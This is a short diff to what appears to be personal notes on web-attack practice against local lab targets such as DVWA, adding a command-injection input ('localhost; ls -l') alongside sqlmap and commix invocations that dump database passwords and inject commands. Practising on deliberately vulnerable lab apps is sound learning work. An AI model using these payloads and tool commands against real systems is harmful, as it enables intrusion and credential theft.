@@ -4,7 +4,11 @@
 ```
 python sqlmap.py -u "http://localhost:8765/read.php?id=1" --passwords
 ```
-<br>3 . [commix](https://github.com/commixproject/commix)
+<br>3 . DVWA - Command Injection:
+```
+localhost; ls -l
+```
+<br>4 . [commix](https://github.com/commixproject/commix)
 ```
 git clone https://github.com/commixproject/commix.git commix
 python commix.py --url="http://localhost:8???/vulnerabilities/exec/#" --data="ip=localhost" --cookie="PHPSESSID=???????????????; security=low"
